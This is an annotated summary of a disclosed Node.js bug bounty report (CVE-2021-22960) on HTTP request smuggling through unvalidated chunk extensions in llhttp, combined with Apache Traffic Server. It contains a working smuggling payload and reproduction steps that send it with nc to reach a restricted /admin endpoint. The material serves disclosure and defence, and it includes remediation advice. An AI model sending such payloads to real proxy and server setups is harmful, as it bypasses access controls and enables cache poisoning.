# HTTP Request Smuggling via Chunk Extensions in llhttp

## Metadata
- **Source:** HackerOne
- **Report:** 1238099 | https://hackerone.com/reports/1238099
- **Submitted:** 2021-06-19
- **Reporter:** mkg
- **Program:** Node.js
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** HTTP Request Smuggling, Input Validation Flaw, Protocol Implementation Error
- **CVEs:** CVE-2021-22960
- **Category:** uncategorised

## Summary
The llhttp parser in Node.js ignores chunk extensions in chunked transfer encoding, allowing any byte including newlines to bypass validation. When Node.js sits behind a proxy like Apache Traffic Server that also mishandles chunk extensions, attackers can smuggle requests to bypass proxy-based access controls.

## Attack scenario
1. Attacker identifies Node.js server running behind Apache Traffic Server proxy
2. Attacker crafts HTTP request with chunked encoding containing illegal newline (LF) in chunk extension field
3. Attacker sends malicious payload where chunk extension contains unvalidated newline character
4. llhttp parser ignores the newline and processes the request body as one request
5. ATS proxy incorrectly parses the same payload and sees it as a single request to allowed endpoint
6. Request smuggling succeeds: proxy forwards request to Node, but Node interprets it as two separate requests, allowing access to restricted endpoint like /admin

## Root cause
llhttp implements chunk extension parsing by naively skipping all bytes until \r character, without validating against RFC 7230 ABNF specification which restricts chunk extensions to bytes 0x09, 0x21-0x7e, and 0x80-0xff. This allows injection of illegal characters including newlines (0x0a), creating desynchronization when combined with proxies that parse chunks differently.

## Attacker mindset
An attacker seeks to bypass proxy-based access controls and security policies. By identifying a mismatch in HTTP parsing between two systems (proxy and origin server), they exploit this desynchronization to inject hidden requests that only the backend server processes, gaining unauthorized access to restricted endpoints.

## Defensive takeaways
- Strictly validate chunk extensions according to RFC 7230 ABNF specification; reject requests with illegal bytes
- Ensure HTTP parsers reject chunk extensions containing newline characters (0x0a, 0x0d)
- Use consistent HTTP parsing libraries between proxy and backend, or validate equivalence
- Implement request smuggling detection: flag requests where chunk encoding appears suspicious
- Add request logging at both proxy and backend layers to detect desynchronization attacks
- Consider disallowing chunked encoding if not required, or enforce strict validation
- Regularly audit third-party HTTP parsing libraries (like llhttp) for RFC compliance

## Variant hunting
Search for similar issues in: (1) Other HTTP parsers that skip chunk extensions without validation, (2) Proxy servers that parse chunks permissively, (3) Any HTTP/1.1 implementation that doesn't enforce RFC 7230 restrictions on chunk extension characters, (4) Go http package, Python http libraries, Java HTTP implementations, (5) Custom HTTP parsing logic in load balancers and WAFs that may not validate chunk extensions properly

## MITRE ATT&CK
- T1190
- T1021
- T1550

## Notes
This vulnerability requires a specific proxy+server combination to be exploitable. The impact is significant because it bypasses proxy-based access controls entirely. The root cause exists in both llhttp (Node.js) and ATS, indicating systemic misunderstanding of RFC 7230 requirements. The reporter notes that ATS also has a bug preventing response exfiltration, but the vulnerability still allows request smuggling for cache poisoning and access control bypass.

## Full report
<details><summary>Expand</summary>

**Summary:**
The `llhttp` parser in the `http` module in Node 16.3.0 ignores chunk extensions when parsing the body of chunked requests. This leads to HTTP Request Smuggling (HRS) when a Node server is put behind an Apache Traffic Server (ATS) 9.0.0 proxy.

**Description:**
In the `chunked` transfer encoding format there can be a so called chunk extension after each chunk size. Example:
```
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

5 ; a=b
hello
0

```
In the example above the chunk extension would be `; a=b`. You can read more here https://datatracker.ietf.org/doc/html/rfc7230#section-4.1.1 and here https://www.rfc-editor.org/errata/eid4667 .

`llhttp` doesn't try to parse the chunk extension properly, but simply ignores every byte until it reaches a `\r` (source: https://github.com/nodejs/llhttp/blob/master/src/llhttp/http.ts#L736-L739). By following the ABNF of chunk extensions one can see that the only allowed bytes in this area are 0x09, 0x21-0x7e and 0x80-0xff. But `llhttp` allows any byte. This is the bug.

Notably we can put a `\n` in this area. This allows us to perform HRS when combined with ATS. This is because ATS also incorrectly parses the chunked extension. ATS looks for the first `\n` character and doesn't verify whether it was preceded by a `\r`. We arrive at the following attack:

```
GET / HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked

2 \nxx
4c
0

GET /admin HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked

0

```

By sending the data above when ATS is a proxy in front of Node, ATS will see one request to `/` and Node will see two requests, one to `/` and one to `/admin`. Note that all lines are terminated by CRLF (`\r\n`) and that `\n` should be replaced with an LF character.

Usually with HRS it is possible to smuggle a request past a proxy directly to the server and then get a response for the smuggled request back to the attacker. But due to a bug in ATS where the connection hangs after a chunked request is sent, we can in this case only send a smuggled request and not see the response. But we have full control over the headers and body of the smuggled request.

Both these bugs have been reported to ATS and have not been fixed yet.

## Steps To Reproduce:

This Proof of Concept requires docker and docker-compose.

Unzip the attached `poc.zip`. Start the systems with `sudo docker-compose up --build`. Now Node can be accessed directly at http://localhost:8081 and ATS (forwarding to Node) can be accessed at http://localhost:8080

Node behaves like this:
```sh
$ curl http://localhost:8081
INDEX
$ curl http://localhost:8081/admin
ADMIN
$ curl http://localhost:8081/forbidden
FORBIDDEN
```

Note that when `/admin` is requested, then `/admin was reached!` is printed in the docker-compose terminal.

ATS behaves like this:
```sh
$ curl http://localhost:8080
INDEX
$ curl http://localhost:8080/admin
FORBIDDEN
$ curl http://localhost:8080/forbidden
FORBIDDEN
```

Note that all requests to `/admin` are rerouted to `/forbidden` by ATS. So the `/admin` endpoint can't be reached.

Now it's time to send the attack described above. This can be done by using the included `payload.py`. The attack can be sent using the following command:

```sh
python3 payload.py | nc localhost 8080
```

When the attack is sent, we see `/admin was reached!` being printed in the terminal. So we bypassed the proxy and reached `/admin`.

(As mentioned before, due to a bug in ATS, the response to the smuggled request can't be seen. If ATS would not have had the mentioned bug, then `payload2.py` could have been used to both send a request and see the response.)

## Impact

If the proxy is acting as an access control system, only allowing certain requests to come through, it can be bypassed, allowing any request to be sent.

</details>

---
*Analysed by Claude on 2026-05-24*
